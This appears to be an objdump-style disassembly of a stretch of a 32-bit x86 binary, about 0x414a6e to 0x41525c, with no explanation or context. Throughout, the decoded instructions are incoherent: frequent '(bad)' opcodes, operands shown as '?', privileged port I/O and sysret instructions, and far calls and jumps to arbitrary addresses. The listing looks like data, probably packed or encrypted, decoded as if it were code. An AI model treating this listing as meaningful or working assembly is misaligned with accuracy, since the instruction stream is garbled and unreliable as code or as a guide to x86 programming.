  414a6e:	jno    0x414a1c
  414a70:	xor    dh,cl
  414a72:	and    eax,0xde6494fd
  414a77:	ins    DWORD PTR es:[edi],dx
  414a78:	test   BYTE PTR [ebx+0x1a],al
  414a7b:	xor    DWORD PTR [eax+0x1],edi
  414a7e:	jp     0x414a89
  414a80:	call   0x8cc72c50
  414a85:	push   0xffffffa8
  414a87:	jmp    0x7c51940
  414a8c:	cmc    
  414a8d:	xchg   ecx,eax
  414a8e:	outs   dx,BYTE PTR ds:[esi]
  414a8f:	push   cs
  414a90:	cmp    eax,0x54f05891
  414a95:	out    dx,eax
  414a96:	mov    al,BYTE PTR [eax]
  414a98:	cmp    BYTE PTR [eax-0x2c13bfe],bh
  414a9e:	mov    ah,0x25
  414aa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414aa1:	call   0xb393:0x67c30376
  414aa8:	cmc    
  414aa9:	bound  eax,QWORD PTR [ecx]
  414aab:	jb     0x414abe
  414aad:	in     eax,0xb5
  414aaf:	stos   BYTE PTR es:[edi],al
  414ab0:	push   gs
  414ab2:	fdivr  DWORD PTR [edi+0x25]
  414ab5:	jo     0x414abd
  414ab7:	add    ebp,DWORD PTR [edi-0x4d]
  414aba:	jecxz  0x414ab4
  414abc:	xlat   BYTE PTR ds:[ebx]
  414abd:	ja     0x414b21
  414abf:	fucomi st,st(1)
  414ac1:	mov    ebp,0x44b7434
  414ac6:	and    al,0x8b
  414ac8:	cli    
  414ac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aca:	test   eax,0x9385b79a
  414acf:	add    ecx,DWORD PTR [edi-0x3d]
  414ad2:	pop    ebp
  414ad3:	xor    al,BYTE PTR [edx]
  414ad5:	xchg   ebp,eax
  414ad6:	fcom   st(1)
  414ad8:	call   0xc97a:0x5d255dd4
  414adf:	xor    eax,0x994aef09
  414ae4:	mov    ?,WORD PTR [esi+edx*2]
  414ae7:	jp     0x414a7c
  414ae9:	pushf  
  414aea:	jl     0x414b11
  414aec:	xchg   edi,eax
  414aed:	jnp    0x414b24
  414aef:	mov    ch,0xfd
  414af1:	and    DWORD PTR [ecx],ecx
  414af3:	adc    eax,0x2130a774
  414af8:	jno    0x414b16
  414afa:	jp     0x414a9a
  414afc:	or     ebx,DWORD PTR [edi+0x5e]
  414aff:	mov    ?,ebp
  414b01:	pop    eax
  414b02:	jle    0x414b5f
  414b04:	or     eax,0xe720b9bb
  414b09:	pop    ecx
  414b0a:	push   0xf6c55530
  414b0f:	dec    ebx
  414b10:	pop    ds
  414b11:	pop    esp
  414b12:	inc    ebx
  414b13:	pusha  
  414b14:	mov    eax,es
  414b16:	icebp  
  414b17:	adc    BYTE PTR [edi+edx*4+0x141d3707],0xd8
  414b1f:	ficomp DWORD PTR [edx]
  414b21:	(bad)  
  414b22:	xchg   esi,eax
  414b23:	sub    eax,0xc5fb4339
  414b28:	mov    dh,0x8f
  414b2a:	mov    DWORD PTR [edi+0x29637beb],esp
  414b30:	daa    
  414b31:	xchg   BYTE PTR [edx+0xefca584],bl
  414b37:	out    0xa8,eax
  414b39:	(bad)  
  414b3a:	aam    0xf4
  414b3c:	(bad)  
  414b3d:	dec    eax
  414b3e:	mov    edi,0x15ef81d7
  414b43:	inc    esp
  414b44:	lods   al,BYTE PTR ds:[esi]
  414b45:	int    0x98
  414b47:	add    al,0x34
  414b49:	inc    eax
  414b4a:	pop    ebx
  414b4b:	out    0x11,eax
  414b4d:	lods   eax,DWORD PTR ds:[esi]
  414b4e:	pop    eax
  414b4f:	mov    ebx,0x2e711a9f
  414b54:	pusha  
  414b55:	stos   BYTE PTR es:[edi],al
  414b56:	enter  0x630b,0xf8
  414b5a:	mov    edi,0xb466bd23
  414b5f:	mov    cx,0x87f4
  414b63:	mov    BYTE PTR ds:0xb38fbdf2,cl
  414b69:	push   es
  414b6a:	adc    bh,dh
  414b6c:	push   ebx
  414b6d:	es test al,0x83
  414b70:	jl     0x414b7c
  414b72:	daa    
  414b73:	bswap  ecx
  414b75:	jo     0x414bed
  414b77:	inc    esi
  414b78:	jg     0x414ba8
  414b7a:	jp     0x414b58
  414b7c:	add    bl,dl
  414b7e:	lods   eax,DWORD PTR ds:[esi]
  414b7f:	sbb    BYTE PTR [edi-0x2f],dh
  414b82:	lock test DWORD PTR [esi],ecx
  414b85:	mov    BYTE PTR [ebx-0x2c9944e],ah
  414b8b:	add    eax,0x29c87aef
  414b90:	clc    
  414b91:	dec    edx
  414b92:	or     al,0x93
  414b94:	outs   dx,BYTE PTR ds:[esi]
  414b95:	aad    0x29
  414b97:	push   0x44aa8564
  414b9c:	sbb    BYTE PTR [edx-0x4e],al
  414b9f:	pusha  
  414ba0:	sub    eax,0xab60dceb
  414ba5:	mov    BYTE PTR [ecx],dh
  414ba7:	out    0x7d,eax
  414ba9:	nop
  414baa:	jns    0x414b71
  414bac:	int    0x8c
  414bae:	cmp    al,0xa9
  414bb0:	pop    ecx
  414bb1:	mov    al,0x65
  414bb3:	rol    BYTE PTR cs:0xff7958cf,cl
  414bba:	dec    eax
  414bbb:	je     0x414b55
  414bbd:	cmp    DWORD PTR [edi+0x44],edx
  414bc0:	jb     0x414c3c
  414bc2:	inc    edx
  414bc3:	xor    ebx,DWORD PTR ds:0x7309d0dd
  414bc9:	(bad)  
  414bca:	fs sub ecx,esi
  414bcd:	sub    al,0xae
  414bcf:	dec    eax
  414bd0:	ja     0x414ba5
  414bd2:	add    esp,edi
  414bd4:	mov    dh,0xce
  414bd6:	dec    esi
  414bd7:	mov    bl,0xde
  414bd9:	(bad)  
  414bda:	push   edi
  414bdb:	sub    eax,0x57a1cbfc
  414be0:	mov    ah,0x98
  414be2:	mov    eax,0x62b2e137
  414be7:	ins    DWORD PTR es:[edi],dx
  414be8:	jmp    0x4da2:0x12071ac7
  414bef:	add    dl,al
  414bf1:	jae    0x414c53
  414bf3:	adc    DWORD PTR [esi],ebx
  414bf5:	sub    bl,bh
  414bf7:	sbb    esi,DWORD PTR [ecx-0x23]
  414bfa:	cmp    al,0x7f
  414bfc:	sbb    eax,0x5b58d4f5
  414c01:	aad    0xd
  414c03:	ins    BYTE PTR es:[edi],dx
  414c04:	daa    
  414c05:	push   esi
  414c06:	gs leave 
  414c08:	(bad)  
  414c09:	lods   eax,DWORD PTR ds:[esi]
  414c0a:	or     ah,BYTE PTR [ecx+edx*2+0x13]
  414c0e:	(bad)  
  414c0f:	push   0xffffffbf
  414c11:	and    edx,DWORD PTR [esi+0x2a3cc3b9]
  414c17:	fwait
  414c18:	ret    
  414c19:	out    dx,al
  414c1a:	(bad)  
  414c1b:	xchg   esi,eax
  414c1c:	das    
  414c1d:	ror    DWORD PTR [ebp-0x2b2a1098],cl
  414c23:	mov    ebx,0xe005032b
  414c28:	pop    ecx
  414c29:	sbb    al,0x3d
  414c2b:	xchg   ebx,eax
  414c2c:	mul    BYTE PTR [esi-0x38cc5dc]
  414c32:	nop
  414c33:	mov    edi,0xb3bf0109
  414c38:	(bad)  
  414c39:	fld    DWORD PTR [ebx+0x70]
  414c3c:	daa    
  414c3d:	(bad)  
  414c3e:	call   0x62a0f579
  414c43:	inc    ebp
  414c44:	mov    eax,ds:0xc3457979
  414c49:	sbb    eax,edx
  414c4b:	jae    0x414ca3
  414c4d:	sub    eax,0xa29b256
  414c52:	cs out 0xae,eax
  414c55:	xchg   ebp,eax
  414c56:	xor    eax,0x78477086
  414c5b:	fsubr  DWORD PTR [edi+0x20854bdf]
  414c61:	icebp  
  414c62:	int3   
  414c63:	push   ecx
  414c64:	inc    bl
  414c66:	imul   edx,DWORD PTR ds:0x89935cb9,0x72722862
  414c70:	xor    DWORD PTR [ecx+0x78b6a6a6],esi
  414c76:	cmp    DWORD PTR [edi-0x12],eax
  414c79:	int3   
  414c7a:	loopne 0x414ce7
  414c7c:	push   edx
  414c7d:	lods   eax,DWORD PTR ds:[esi]
  414c7e:	add    bh,dh
  414c80:	push   ebp
  414c81:	jg     0x414c9f
  414c83:	fnstcw WORD PTR [esi]
  414c85:	cld    
  414c86:	daa    
  414c87:	push   edi
  414c88:	and    edx,0xffffff82
  414c8b:	cmp    al,0x58
  414c8d:	dec    edx
  414c8e:	xchg   DWORD PTR [ebp+0x4a],eax
  414c91:	add    al,0x39
  414c93:	xchg   ebx,eax
  414c94:	xor    al,0x94
  414c96:	mov    edx,0xec267176
  414c9b:	cdq    
  414c9c:	jle    0x414d0b
  414c9e:	jg     0x414ccf
  414ca0:	xchg   ebx,eax
  414ca1:	ret    
  414ca2:	inc    edi
  414ca3:	lods   al,BYTE PTR ds:[esi]
  414ca4:	mov    al,ds:0x22598ff2
  414ca9:	movups XMMWORD PTR [eax+eax*8+0x54ec2a7f],xmm4
  414cb1:	pop    eax
  414cb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cb3:	ret    
  414cb4:	or     al,0x3b
  414cb6:	bnd ss jle 0x414c60
  414cba:	push   cs
  414cbb:	add    DWORD PTR [ecx+0x1dfb75cc],ecx
  414cc1:	rol    BYTE PTR [ecx-0x6f],0x83
  414cc5:	loope  0x414c4d
  414cc7:	cli    
  414cc8:	fdivr  st,st(6)
  414cca:	mov    cs,WORD PTR es:[ecx-0x7b9b8c33]
  414cd1:	shr    esi,0x90
  414cd4:	adc    eax,0xf604e696
  414cd9:	add    BYTE PTR [edi],cl
  414cdb:	adc    eax,0x249c7e75
  414ce0:	xor    DWORD PTR [esi-0x9f81515],ebp
  414ce6:	mov    esi,0x4f266c0d
  414ceb:	mov    DWORD PTR [edx+0x67],edx
  414cee:	mov    dh,BYTE PTR [edx+0x11d878cb]
  414cf4:	push   0x7e
  414cf6:	js     0x414d75
  414cf8:	push   DWORD PTR ds:0x33bc6e6c
  414cfe:	xor    eax,0xb70f9975
  414d03:	adc    ebx,DWORD PTR [edx+0x526f7adf]
  414d09:	sbb    dl,al
  414d0b:	xor    dh,BYTE PTR [ebx-0x6a]
  414d0e:	xlat   BYTE PTR ds:[ebx]
  414d0f:	test   BYTE PTR [edi+0x6d67bb94],0x6d
  414d16:	xor    al,0x58
  414d18:	sub    edx,DWORD PTR [edi-0x58763f81]
  414d1e:	ins    DWORD PTR es:[edi],dx
  414d1f:	sbb    dl,dl
  414d21:	push   ebx
  414d22:	mov    esp,0x919b1f2c
  414d27:	sub    cl,BYTE PTR [esi+0x62f26faa]
  414d2d:	push   ecx
  414d2e:	and    DWORD PTR [eax],eax
  414d30:	adc    ebx,DWORD PTR [edx+eax*4+0x11]
  414d34:	dec    edi
  414d35:	mov    ebp,0x50d3fe89
  414d3a:	gs dec edi
  414d3c:	sbb    eax,0x306b7d79
  414d41:	xor    dl,BYTE PTR [edi+0x62]
  414d44:	mov    edi,0x73e08b4a
  414d49:	ret    0xe3f8
  414d4c:	jnp    0x414dc0
  414d4e:	enter  0x497b,0x7d
  414d52:	pop    esp
  414d53:	clc    
  414d54:	rcr    BYTE PTR [eax+0x6c],0xc1
  414d58:	push   ss
  414d59:	and    ch,BYTE PTR [ecx]
  414d5b:	aaa    
  414d5c:	lods   al,BYTE PTR ds:[esi]
  414d5d:	and    BYTE PTR ds:0xe9deb4a4,bl
  414d63:	call   0x544e7c8f
  414d68:	ss and edx,ecx
  414d6b:	clc    
  414d6c:	or     ebx,ebp
  414d6e:	out    dx,al
  414d6f:	mov    DWORD PTR [ebx+0x547dce95],edx
  414d75:	rcl    BYTE PTR ds:0x5fb22418,1
  414d7b:	lock and eax,0x9c0727c5
  414d81:	jle    0x414dca
  414d83:	or     bh,ch
  414d85:	dec    ebx
  414d86:	and    bh,bl
  414d88:	push   ds
  414d89:	pop    ss
  414d8a:	xor    al,BYTE PTR ds:0x37ba2e0
  414d90:	xchg   edx,eax
  414d91:	arpl   WORD PTR [edx+0x1da106fc],bx
  414d97:	inc    ebx
  414d98:	jp     0x414df7
  414d9a:	shr    BYTE PTR ds:0xd46d84f9,0x2
  414da1:	push   0xffffffc8
  414da3:	loopne 0x414dd7
  414da5:	push   ecx
  414da6:	imul   ecx,esp,0x6730216b
  414dac:	stc    
  414dad:	adc    DWORD PTR [eax],esi
  414daf:	fnsave [edi]
  414db1:	and    dl,BYTE PTR [eax]
  414db3:	das    
  414db4:	fwait
  414db5:	lahf   
  414db6:	cmp    eax,0x5de1cdca
  414dbb:	rcl    BYTE PTR ds:0xb74b038f,1
  414dc1:	cmp    BYTE PTR [ecx+eiz*2+0x7a],al
  414dc5:	xor    eax,0xd24a4385
  414dca:	jns    0x414dd3
  414dcc:	sub    eax,DWORD PTR [ebp-0x3d]
  414dcf:	std    
  414dd0:	popf   
  414dd1:	jnp    0x414e1a
  414dd3:	xor    DWORD PTR [ebx],eax
  414dd5:	sub    DWORD PTR [ecx+0x55],eax
  414dd8:	mov    eax,0x558430ed
  414ddd:	and    ebp,DWORD PTR [ebx]
  414ddf:	(bad)  
  414de0:	jmp    FWORD PTR [esi]
  414de2:	jmp    0x8cd01fdd
  414de7:	add    bl,0xce
  414dea:	(bad)  
  414deb:	fdiv   st,st(0)
  414ded:	cli    
  414dee:	out    dx,al
  414def:	push   esp
  414df0:	jmp    0xa82b:0xbc248258
  414df7:	into   
  414df8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414df9:	aaa    
  414dfa:	cdq    
  414dfb:	retf   
  414dfc:	mov    bl,BYTE PTR [edi]
  414dfe:	mov    ah,0xfb
  414e00:	mov    eax,ds:0xcb7cc00a
  414e05:	je     0x414e45
  414e07:	jg     0x414e82
  414e09:	std    
  414e0a:	loop   0x414dc5
  414e0c:	mov    ch,0xce
  414e0e:	out    dx,eax
  414e0f:	mov    ah,BYTE PTR [esi-0x69c4e3d0]
  414e15:	mov    ch,0x7f
  414e17:	mov    ds:0x3327f30f,eax
  414e1c:	pop    si
  414e1e:	es jl  0x414e21
  414e21:	loope  0x414e91
  414e23:	and    cl,BYTE PTR [ebx+0x2944e174]
  414e29:	xor    BYTE PTR [esi],0xfb
  414e2c:	fisttp QWORD PTR [edi-0x248b43aa]
  414e32:	sub    esp,edx
  414e34:	mov    BYTE PTR [edi],bh
  414e36:	inc    eax
  414e37:	arpl   bp,di
  414e39:	add    al,BYTE PTR [ecx+0x24975c5d]
  414e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414e40:	inc    ebx
  414e41:	add    eax,0xa53df5a0
  414e46:	xchg   esp,edx
  414e48:	jle    0x414e31
  414e4a:	(bad)
  414e4d:	pusha  
  414e4e:	enter  0x6a88,0x10
  414e52:	add    BYTE PTR [esi-0x19],al
  414e55:	mov    esp,0xe76b50e8
  414e5a:	or     edi,esp
  414e5c:	and    eax,0x3ab3c770
  414e61:	mov    ebp,0xc68c07c7
  414e66:	fwait
  414e67:	cmp    ah,BYTE PTR [ecx-0x5d]
  414e6a:	or     eax,0x407dee6c
  414e6f:	lahf   
  414e70:	or     al,0x41
  414e72:	cmp    BYTE PTR ds:0x78108700,al
  414e78:	rol    DWORD PTR [edx+0x18],cl
  414e7b:	rcl    DWORD PTR [edx+ecx*4+0x4c],1
  414e7f:	push   ebp
  414e80:	sub    DWORD PTR [eax],0x61
  414e83:	gs cs in eax,dx
  414e86:	and    eax,0x347a8bc0
  414e8b:	adc    bh,ah
  414e8d:	stos   DWORD PTR es:[edi],eax
  414e8e:	push   ds
  414e8f:	mov    ds:0xa5f3b25a,al
  414e94:	fdivr  DWORD PTR [edx]
  414e96:	js     0x414e21
  414e98:	dec    eax
  414e99:	das    
  414e9a:	mul    DWORD PTR [ecx+0x6ba12ac7]
  414ea0:	jbe    0x414e95
  414ea2:	sbb    DWORD PTR [edx-0x5f],ecx
  414ea5:	data16 data16 jae 0x414ec9
  414ea9:	clc    
  414eaa:	(bad)  [esi+0x4924f9b5]
  414eb0:	and    BYTE PTR [ebp+0x40c1f2eb],bh
  414eb6:	mov    bl,0xeb
  414eb8:	jge    0x414ec6
  414eba:	(bad)  
  414ebc:	or     al,0x85
  414ebe:	xor    dh,bh
  414ec0:	out    dx,eax
  414ec1:	sub    eax,0x180b14a8
  414ec6:	clc    
  414ec7:	add    eax,0x942f5ac6
  414ecc:	xchg   esi,eax
  414ecd:	xor    al,0x2d
  414ecf:	push   esp
  414ed0:	add    ebp,DWORD PTR [ebp+0x565e7635]
  414ed6:	sub    al,0x7b
  414ed8:	pusha  
  414ed9:	xor    al,0x8d
  414edb:	es inc eax
  414edd:	lahf   
  414ede:	push   0x6
  414ee0:	call   0xb46:0xd1ebfcdc
  414ee7:	(bad)  [edi+edx*4]
  414eea:	sub    al,0x4f
  414eec:	test   BYTE PTR [edi],al
  414eee:	add    edi,ecx
  414ef0:	sbb    DWORD PTR [esi-0x12],edi
  414ef3:	xchg   ch,dh
  414ef5:	jl     0x414eaa
  414ef7:	lock mov ds:0xf0d78641,al
  414efd:	shl    dl,0x8
  414f00:	ds jle 0x414ea9
  414f03:	mov    bl,BYTE PTR [ebp-0x3]
  414f06:	jmp    0x1d0cced3
  414f0b:	out    0x1b,al
  414f0d:	or     cl,BYTE PTR [ebx-0x7ed9bdb7]
  414f13:	mov    ds:0xa2b37f0c,eax
  414f18:	xchg   ecx,eax
  414f19:	pop    ss
  414f1a:	and    BYTE PTR [edx],al
  414f1c:	jmp    0xf5bae82e
  414f21:	mov    al,0xd6
  414f23:	jge    0x414f7c
  414f25:	pop    es
  414f26:	xchg   esi,eax
  414f27:	je     0x414f89
  414f29:	push   eax
  414f2a:	push   ebx
  414f2b:	inc    ecx
  414f2c:	scas   eax,DWORD PTR es:[edi]
  414f2d:	mov    BYTE PTR [edx+0x57],cl
  414f30:	pop    ds
  414f31:	test   al,0xc6
  414f33:	xchg   ecx,eax
  414f34:	xchg   BYTE PTR [ecx],bl
  414f36:	loop   0x414f27
  414f38:	mov    esp,fs
  414f3a:	icebp  
  414f3b:	das    
  414f3c:	jecxz  0x414faf
  414f3e:	or     al,0x18
  414f40:	rol    eax,cl
  414f42:	fdiv   QWORD PTR [edi-0x7cd34fdc]
  414f48:	mov    DWORD PTR [esi-0x71],esp
  414f4b:	mov    esi,ebx
  414f4d:	sbb    al,0x42
  414f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f50:	pop    edi
  414f51:	xchg   edx,eax
  414f52:	mov    dh,0xc3
  414f54:	xchg   esp,eax
  414f55:	push   esp
  414f56:	pop    ecx
  414f57:	mov    edx,0x5c59b32e
  414f5c:	addr16 jb 0x414f39
  414f5f:	ja     0x414fa3
  414f61:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f62:	sub    al,0xfd
  414f64:	out    dx,eax
  414f65:	and    eax,0x158ba6c7
  414f6a:	out    0x48,eax
  414f6c:	sbb    eax,0x2c33e1bc
  414f71:	std    
  414f72:	mov    ch,0xf2
  414f74:	pop    edi
  414f75:	adc    ebp,DWORD PTR [ebp+0xf0f84f5]
  414f7b:	sub    eax,0x30a034a0
  414f80:	stc    
  414f81:	mov    DWORD PTR [ecx-0x20],0x5e54c90d
  414f88:	xor    eax,0x8a1cdc0c
  414f8d:	pusha  
  414f8e:	and    dl,BYTE PTR [ebx]
  414f90:	clc    
  414f91:	adc    al,ch
  414f93:	and    al,0x7d
  414f95:	sar    DWORD PTR [esp+eax*1-0x159335a9],0x70
  414f9d:	scas   eax,DWORD PTR es:[edi]
  414f9e:	cmp    BYTE PTR [ebx],dh
  414fa0:	and    BYTE PTR [edi-0x73c435f7],cl
  414fa6:	xchg   esi,eax
  414fa7:	sbb    esp,DWORD PTR [edx+0x7deaa56f]
  414fad:	mov    DWORD PTR ds:[edx+0x4275b2ea],edx
  414fb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb5:	jno    0x414fd4
  414fb7:	xchg   BYTE PTR [edi],dh
  414fb9:	push   edx
  414fba:	cmp    dh,BYTE PTR [esi*1+0x11100ae9]
  414fc1:	push   esi
  414fc2:	and    ch,BYTE PTR [ecx]
  414fc4:	enter  0x566c,0xd3
  414fc8:	jge    0x415037
  414fca:	fdiv   QWORD PTR [ebx-0x44]
  414fcd:	dec    edx
  414fce:	xchg   edx,eax
  414fcf:	jle    0x414fed
  414fd1:	adc    BYTE PTR ds:0xdf693dbd,al
  414fd7:	pop    ss
  414fd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fd9:	xchg   ebp,eax
  414fda:	stos   DWORD PTR es:[edi],eax
  414fdb:	imul   edi,DWORD PTR [eax+edx*8-0x64],0xffffffed
  414fe0:	ret    
  414fe1:	test   al,0x1e
  414fe3:	imul   ecx,DWORD PTR [edi-0x2dc47a21],0xa62a70a
  414fed:	push   ss
  414fee:	outs   dx,BYTE PTR ds:[esi]
  414fef:	stos   BYTE PTR es:[edi],al
  414ff0:	sub    esi,esi
  414ff2:	mov    dh,0x52
  414ff4:	mov    esi,0xbd2c0b2b
  414ff9:	stc    
  414ffa:	lods   al,BYTE PTR ds:[esi]
  414ffb:	mov    eax,ds:0xcbb3aa01
  415000:	vpsrlw xmm5,xmm2,XMMWORD PTR [ecx-0x3d]
  415005:	lock jp 0x414ff8
  415008:	cmp    DWORD PTR [ebx-0x365be0d7],eax
  41500e:	sub    DWORD PTR [edx+0x53b02ccc],esi
  415014:	fnstsw WORD PTR [eax-0x17886c4d]
  41501a:	mov    dl,0xfa
  41501c:	ret    0x4205
  41501f:	jne    0x415093
  415021:	call   0x2f53b703
  415026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415027:	add    BYTE PTR [eax+0x6d],dl
  41502a:	pushf  
  41502b:	enter  0x9d74,0xd9
  41502f:	fcomp  QWORD PTR [ebp+0x12d6f19]
  415035:	mov    esi,0x305aa424
  41503a:	aam    0x1d
  41503c:	lahf   
  41503d:	mov    esi,0xaf9baf83
  415042:	or     al,cl
  415044:	fisttp WORD PTR [esi-0x2bfa987c]
  41504a:	das    
  41504b:	inc    ebx
  41504c:	xor    edx,edi
  41504e:	xchg   DWORD PTR [eax],ecx
  415050:	sbb    al,0xda
  415052:	bound  edx,QWORD PTR [edx]
  415054:	mov    eax,ds:0x377029a3
  415059:	inc    esp
  41505a:	sub    BYTE PTR [ecx+0x14],0xfa
  41505e:	dec    esi
  41505f:	mov    ?,WORD PTR [ebx+0xb]
  415062:	inc    ebx
  415063:	jnp    0x4150c0
  415065:	or     eax,0x6810e68e
  41506a:	call   0x3c69138b
  41506f:	xchg   edx,eax
  415070:	daa    
  415071:	arpl   WORD PTR [esi+0x2a],ax
  415074:	loop   0x4150ee
  415076:	xlat   BYTE PTR ds:[ebx]
  415077:	or     eax,0x68ea8323
  41507c:	jmp    0xa910ca83
  415081:	outs   dx,BYTE PTR ds:[esi]
  415082:	es out dx,eax
  415084:	sub    eax,0x16d8598
  415089:	call   0xacba:0x3fe09c73
  415090:	stc    
  415091:	lock sahf 
  415093:	mov    ch,BYTE PTR [esp+esi*1+0x1e71909f]
  41509a:	sahf   
  41509b:	int3   
  41509c:	sbb    bl,bl
  41509e:	fwait
  41509f:	mov    bl,0xf3
  4150a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150a2:	js     0x4150a8
  4150a4:	mov    al,0x33
  4150a6:	jno    0x415104
  4150a8:	xchg   edx,eax
  4150a9:	stos   BYTE PTR es:[edi],al
  4150aa:	jle    0x41512b
  4150ac:	dec    edx
  4150ad:	aas    
  4150ae:	push   cs
  4150af:	(bad)  ds:0x1328ae82
  4150b5:	sar    dl,cl
  4150b7:	pop    ebp
  4150b8:	jae    0x415063
  4150ba:	push   edi
  4150bb:	cdq    
  4150bc:	cmc    
  4150bd:	fld    DWORD PTR [esi*2+0x35150ad1]
  4150c4:	jbe    0x415047
  4150c6:	into   
  4150c7:	xchg   esp,eax
  4150c8:	ror    BYTE PTR [eax],1
  4150ca:	mov    eax,cs
  4150cc:	(bad)  
  4150cd:	sub    DWORD PTR [esi-0x29],esp
  4150d0:	xchg   esi,eax
  4150d1:	mov    ds:0x1972c49e,eax
  4150d6:	sbb    BYTE PTR [ebx+0x47080009],ah
  4150dc:	mov    bh,0x78
  4150de:	sub    al,0xd8
  4150e0:	sbb    al,0xf2
  4150e2:	push   ss
  4150e3:	xor    BYTE PTR ds:0x4c94a23f,bl
  4150e9:	lods   al,BYTE PTR ds:[esi]
  4150ea:	jl     0x41507d
  4150ec:	sub    ebx,eax
  4150ee:	push   ecx
  4150ef:	push   ebp
  4150f0:	lods   eax,DWORD PTR ds:[esi]
  4150f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150f2:	cmp    dl,bh
  4150f4:	mov    al,ds:0xdf571675
  4150f9:	(bad)  
  4150fa:	pusha  
  4150fb:	cdq    
  4150fc:	jmp    0x415093
  4150fe:	fidiv  WORD PTR [eax+0x33]
  415101:	cli    
  415102:	sbb    DWORD PTR [ebx+0x411a1cd3],edi
  415108:	(bad)  
  415109:	aaa    
  41510a:	(bad)  
  41510c:	lea    sp,[esi-0x61]
  415110:	lods   eax,DWORD PTR ds:[esi]
  415111:	inc    esp
  415112:	popf   
  415113:	xor    al,0xde
  415115:	dec    ecx
  415116:	das    
  415117:	dec    ecx
  415118:	add    dh,BYTE PTR [ecx]
  41511a:	xchg   edi,eax
  41511b:	shl    bl,1
  41511d:	lds    ecx,FWORD PTR [edi]
  41511f:	adc    esp,DWORD PTR [eax+ebx*8+0x1c010d1b]
  415126:	shr    BYTE PTR [eax-0x49],0x27
  41512a:	sub    al,0xa3
  41512c:	in     eax,dx
  41512d:	push   esi
  41512e:	mov    eax,0x505547f8
  415133:	gs mov eax,0x8bea07f5
  415139:	repz sub cl,al
  41513c:	inc    edi
  41513d:	fidivr WORD PTR [edx]
  41513f:	mov    eax,ds:0x8c64a684
  415144:	out    dx,eax
  415145:	ja     0x415152
  415147:	cli    
  415148:	cli    
  415149:	and    BYTE PTR [ecx+0x7e],ah
  41514c:	mov    ds:0x1bb83f30,eax
  415151:	xchg   ebp,eax
  415152:	sub    ecx,esp
  415154:	nop
  415155:	mov    WORD PTR [ecx+ecx*1+0x5],gs
  415159:	pop    es
  41515a:	ffree  st(0)
  41515c:	leave  
  41515d:	std    
  41515e:	call   0x31736617
  415163:	jl     0x4151a3
  415165:	jns    0x4151b6
  415167:	scas   al,BYTE PTR es:[edi]
  415168:	pop    eax
  415169:	sub    eax,DWORD PTR [ecx+0x31]
  41516c:	jecxz  0x415177
  41516e:	ret    0xd89
  415171:	lods   eax,DWORD PTR ds:[esi]
  415172:	xchg   edi,eax
  415173:	rcl    BYTE PTR [ebx],cl
  415175:	lds    ebx,FWORD PTR [ecx+0xe1676dc]
  41517b:	repz mov esp,0xb5a85eb8
  415181:	mov    DWORD PTR [ecx],0x33251544
  415187:	inc    edi
  415188:	sbb    ebx,esi
  41518a:	fstp   TBYTE PTR [ecx]
  41518c:	ds inc eax
  41518e:	push   esi
  41518f:	mov    DWORD PTR [esi+0x7a],ecx
  415192:	and    eax,DWORD PTR [eax-0x78]
  415195:	inc    edx
  415196:	mov    eax,0x13c3c0d2
  41519b:	sub    ecx,esi
  41519d:	call   0x42df1d1e
  4151a2:	cdq    
  4151a3:	jge    0x4151ce
  4151a5:	sub    BYTE PTR [esp+edx*8+0x59444fa1],al
  4151ac:	sysret 
  4151ae:	sub    al,0xb0
  4151b0:	shl    DWORD PTR [esi+0x763ff1c7],0xd
  4151b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151b8:	js     0x4151ed
  4151ba:	jmp    0x6a0bf016
  4151bf:	icebp  
  4151c0:	sub    ecx,DWORD PTR [edx-0x78d6a95]
  4151c6:	mov    edx,0x7eb5b9c1
  4151cb:	dec    ecx
  4151cc:	pop    ss
  4151cd:	mov    DWORD PTR [ebx-0x4fb6fc3f],ebp
  4151d3:	jo     0x4151a3
  4151d5:	pop    es
  4151d6:	and    ebp,ecx
  4151d8:	dec    ebp
  4151d9:	cld    
  4151da:	(bad)  
  4151dc:	in     eax,dx
  4151dd:	xchg   edi,eax
  4151de:	outs   dx,BYTE PTR ds:[esi]
  4151df:	(bad)  
  4151e0:	lock mov al,ss:0x8c296e6f
  4151e7:	sbb    BYTE PTR ds:0x6a9338f3,dh
  4151ed:	(bad)
  4151f1:	or     DWORD PTR [ebx+0x4c3307e4],eax
  4151f7:	dec    eax
  4151f8:	pop    ds
  4151f9:	pop    esp
  4151fa:	mov    edi,0xe786404a
  4151ff:	jp     0x4151ad
  415201:	sbb    BYTE PTR [edi-0x56],0xce
  415205:	sub    al,0x29
  415207:	sub    ebp,DWORD PTR [edx]
  415209:	das    
  41520a:	push   0xdd846c20
  41520f:	fsubr  QWORD PTR [ebp-0x13067f00]
  415215:	xor    BYTE PTR [edx+0x15],al
  415218:	out    0xc3,eax
  41521a:	jmp    0x2c41:0xa8a161d
  415221:	add    DWORD PTR [esi-0x80],esp
  415224:	js     0x41524f
  415226:	bound  ebp,QWORD PTR [esi-0x2f]
  415229:	adc    BYTE PTR [esi],0x94
  41522c:	add    ecx,DWORD PTR [eax+ebx*2]
  41522f:	fldenv [ecx]
  415231:	fwait
  415232:	rol    edi,cl
  415234:	xchg   esi,eax
  415235:	loop   0x415201
  415237:	cs inc ecx
  415239:	xchg   ebp,eax
  41523a:	xchg   esp,eax
  41523b:	retf   0xfc5d
  41523e:	pop    ds
  41523f:	pop    eax
  415240:	out    0xd5,eax
  415242:	add    DWORD PTR [eax+0x6c44ad9],edx
  415248:	fwait
  415249:	jae    0x415294
  41524b:	loopne 0x4151d2
  41524d:	fistp  QWORD PTR [ebp-0x34ad8dce]
  415253:	adc    dh,BYTE PTR [edi]
  415255:	or     BYTE PTR [eax+esi*1-0xe],bh
  415259:	fidivr WORD PTR [ecx-0x51]
  41525c:	pop    esi
